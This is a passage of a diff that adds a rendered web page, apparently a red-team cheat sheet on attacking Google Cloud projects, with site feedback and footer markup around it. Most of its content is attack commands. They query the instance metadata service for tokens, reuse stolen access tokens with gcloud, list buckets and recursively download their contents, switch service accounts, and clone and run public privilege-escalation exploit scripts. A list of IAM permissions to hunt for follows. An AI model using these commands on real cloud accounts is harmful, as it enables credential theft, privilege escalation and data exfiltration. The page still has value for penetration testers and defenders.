+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a><span class="c1"># Get all metadata (information disclosure)</span>
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Metadata-Flavor: Google&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a><span class="w">  </span><span class="s2">&quot;http://169.254.169.254/computeMetadata/v1/instance/?recursive=true&quot;</span>
+</span></code></pre></div>
+<p><strong>Using Stolen Access Tokens:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># Save token to file</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ya29.[TOKEN]&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>token.txt
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="c1"># Use token for API calls</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>gcloud<span class="w"> </span>projects<span class="w"> </span>list<span class="w"> </span>--access-token-file<span class="w"> </span>token.txt
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="c1"># Alternative token usage</span>
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="nb">export</span><span class="w"> </span><span class="nv">CLOUDSDK_AUTH_ACCESS_TOKEN</span><span class="o">=</span><span class="k">$(</span>cat<span class="w"> </span>token.txt<span class="k">)</span>
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>gcloud<span class="w"> </span>projects<span class="w"> </span>list
+</span></code></pre></div>
+<h3 id="storage-bucket-enumeration-exfiltration">Storage Bucket Enumeration &amp; Exfiltration<a class="headerlink" href="#storage-bucket-enumeration-exfiltration" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># List storage buckets</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>gcloud<span class="w"> </span>storage<span class="w"> </span>ls<span class="w"> </span>--access-token-file<span class="w"> </span>token.txt
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="c1"># List contents of specific bucket</span>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>gcloud<span class="w"> </span>storage<span class="w"> </span>ls<span class="w"> </span>gs://<span class="o">[</span>BUCKET_NAME<span class="o">]</span><span class="w"> </span>--access-token-file<span class="w"> </span>token.txt
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="c1"># Download files from bucket</span>
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>gcloud<span class="w"> </span>storage<span class="w"> </span>cp<span class="w"> </span>gs://<span class="o">[</span>BUCKET_NAME<span class="o">]</span>/<span class="o">[</span>FILE_PATH<span class="o">]</span><span class="w"> </span>.<span class="w"> </span>--access-token-file<span class="w"> </span>token.txt
+</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>
+</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a><span class="c1"># Recursive download</span>
+</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a>gcloud<span class="w"> </span>storage<span class="w"> </span>cp<span class="w"> </span>gs://<span class="o">[</span>BUCKET_NAME<span class="o">]</span>/*<span class="w"> </span>.<span class="w"> </span>--recursive<span class="w"> </span>--access-token-file<span class="w"> </span>token.txt
+</span></code></pre></div>
+<h3 id="privilege-escalation-pathways">Privilege Escalation Pathways<a class="headerlink" href="#privilege-escalation-pathways" title="Permanent link">&para;</a></h3>
+<p><strong>Service Account Chain Switching:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1"># Authenticate with new service account</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>gcloud<span class="w"> </span>auth<span class="w"> </span>activate-service-account<span class="w"> </span>--key-file<span class="w"> </span>new-sa-key.json
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="c1"># Check new permissions</span>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>gcloud<span class="w"> </span>projects<span class="w"> </span>get-iam-policy<span class="w"> </span><span class="o">[</span>PROJECT_ID<span class="o">]</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="w">  </span>--flatten<span class="o">=</span><span class="s2">&quot;bindings[].members&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="w">  </span>--filter<span class="o">=</span><span class="s2">&quot;bindings.members=serviceaccount:[NEW_SERVICE_ACCOUNT]&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="w">  </span>--format<span class="o">=</span><span class="s2">&quot;value(bindings.role)&quot;</span>
+</span></code></pre></div>
+<h3 id="automated-enumeration-tools">Automated Enumeration Tools<a class="headerlink" href="#automated-enumeration-tools" title="Permanent link">&para;</a></h3>
+<p><strong>GCP Enumeration Script:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1"># Download and execute</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>git<span class="w"> </span>clone<span class="w"> </span>https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_enum.git
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="nb">cd</span><span class="w"> </span>gcp_enum
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>chmod<span class="w"> </span>+x<span class="w"> </span>gcp_enum.sh
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>./gcp_enum.sh
+</span></code></pre></div>
+<p><strong>Privilege Escalation Scanners:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c1"># Privesc Scanner</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>python3<span class="w"> </span>enumerate_member_permissions.py<span class="w"> </span>-p<span class="w"> </span><span class="o">[</span>PROJECT_ID<span class="o">]</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>python3<span class="w"> </span>check_for_privesc.py
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="c1"># Rhino Security Labs GCP-IAM-Privilege-Escalation</span>
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation.git
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="nb">cd</span><span class="w"> </span>GCP-IAM-Privilege-Escalation
+</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>python3<span class="w"> </span>ExploitScripts/iam.roles.update.py
+</span></code></pre></div>
+<h3 id="additional-red-team-tools">Additional Red Team Tools<a class="headerlink" href="#additional-red-team-tools" title="Permanent link">&para;</a></h3>
+<p><strong>Comprehensive GCP Security Tools:</strong></p>
+<ul>
+<li><strong>GCPGoat</strong>: intentionally vulnerable GCP environment</li>
+<li><strong>ScoutSuite</strong>: multi-cloud security auditing tool</li>
+<li><strong>Forseti Security</strong>: GCP security monitoring</li>
+<li><strong>Terrascan</strong>: infrastructure as code security scanner</li>
+</ul>
+<h3 id="common-misconfigurations">Common Misconfigurations<a class="headerlink" href="#common-misconfigurations" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Over-privileged service accounts</li>
+<li>Public storage buckets</li>
+<li>Weak IAM policies</li>
+<li>Exposed metadata services</li>
+</ul>
+<h3 id="critical-permissions-to-hunt">Critical Permissions to Hunt<a class="headerlink" href="#critical-permissions-to-hunt" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>iam.serviceAccounts.getAccessToken</code></li>
+<li><code>iam.roles.update</code></li>
+<li><code>resourcemanager.projects.setIamPolicy</code></li>
+<li><code>storage.buckets.get</code></li>
+</ul>
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+
+
+
+  <form class="md-feedback" name="feedback" hidden>
+    <fieldset>
+      <legend class="md-feedback__title">
+        Was this page helpful?
+      </legend>
+      <div class="md-feedback__inner">
+        <div class="md-feedback__list">
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page was helpful" data-md-value="1">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 9v12H1V9zm4 12a2 2 0 0 1-2-2V9c0-.55.22-1.05.59-1.41L14.17 1l1.06 1.06c.27.27.44.64.44 1.05l-.03.32L14.69 8H21a2 2 0 0 1 2 2v2c0 .26-.05.5-.14.73l-3.02 7.05C19.54 20.5 18.83 21 18 21zm0-2h9.03L21 12v-2h-8.79l1.13-5.32L9 9.03z"/></svg>
+            </button>
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page could be improved" data-md-value="0">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 15V3h4v12zM15 3a2 2 0 0 1 2 2v10c0 .55-.22 1.05-.59 1.41L9.83 23l-1.06-1.06c-.27-.27-.44-.64-.44-1.06l.03-.31.95-4.57H3a2 2 0 0 1-2-2v-2c0-.26.05-.5.14-.73l3.02-7.05C4.46 3.5 5.17 3 6 3zm0 2H5.97L3 12v2h8.78l-1.13 5.32L15 14.97z"/></svg>
+            </button>
+          
+        </div>
+        <div class="md-feedback__note">
+          
+            <div data-md-value="1" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks for your feedback!
+            </div>
+          
+            <div data-md-value="0" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+                Thanks for your feedback! Help us improve this page by
+  using our <a href="..." target="_blank" rel="noopener">feedback form</a>.
+
+            </div>
+          
+        </div>
+      </div>
+    </fieldset>
+  </form>
+
+
+  <h2 id="__comments">Comments</h2>
+  <!-- Insert generated snippet here -->
+
+<script src="https://giscus.app/client.js"
+        data-repo="hacktardinc/hacktardinc.github.io"
+        data-repo-id="R_kgDORs4YuA"
+        data-category="Q&A"
+        data-category-id="DIC_kwDORs4YuM4C48_S"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="dark_tritanopia"
+        data-lang="en"
+        crossorigin="anonymous"
+        async>
+</script>
+
+  <!-- Synchronize Giscus theme with palette -->
+  <script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    // Set palette on initial load
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+      var theme = palette.color.scheme === "slate"
+        ? "transparent_dark"
+        : "light"
+
+      // Instruct Giscus to set theme
+      giscus.setAttribute("data-theme", theme) 
+    }
+
+    // Register event handlers after documented loaded
+    document.addEventListener("DOMContentLoaded", function() {
+      var ref = document.querySelector("[data-md-component=palette]")
+      ref.addEventListener("change", function() {
+        var palette = __md_get("__palette")
+        if (palette && typeof palette.color === "object") {
+          var theme = palette.color.scheme === "slate"
+            ? "transparent_dark"
+            : "light"
+
+          // Instruct Giscus to change theme
+          var frame = document.querySelector(".giscus-frame")
+          frame.contentWindow.postMessage(
+            { giscus: { setConfig: { theme } } },
+            "https://giscus.app"
+          )
+        }
+      })
+    })
+  </script>
+
+                
               </article>
             </div>
           
@@ -2097,6 +3392,44 @@
       
         <footer class="md-footer">
   
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../azure/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Azure">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Azure
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../tools/" class="md-footer__link md-footer__link--next" aria-label="Next: Tools">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Tools
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-right" viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </div>
+          </a>
+        
+      </nav>
     
   
   <div class="md-footer-meta md-typeset">
@@ -2242,10 +3575,10 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate":null,"base":"/","features":["announce.dismiss","content.code.annotate","content.code.copy","content.code.select","content.footnote.tooltips","content.tabs.link","content.tooltips","navigation.footer","navigation.indexes","navigation.instant","navigation.instant.prefetch","navigation.instant.progress","navigation.path","navigation.top","navigation.tracking","search.highlight"],"search":"/assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
+      <script id="__config" type="application/json">{"annotate":null,"base":"../..","features":["announce.dismiss","content.code.annotate","content.code.copy","content.code.select","content.footnote.tooltips","content.tabs.link","content.tooltips","navigation.footer","navigation.indexes","navigation.instant","navigation.instant.prefetch","navigation.instant.progress","navigation.path","navigation.top","navigation.tracking","search.highlight"],"search":"../../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
     
     
-      <script src="/assets/javascripts/bundle.c2b142ea.min.js"></script>
+      <script src="../../assets/javascripts/bundle.c2b142ea.min.js"></script>
       
     
   </body>
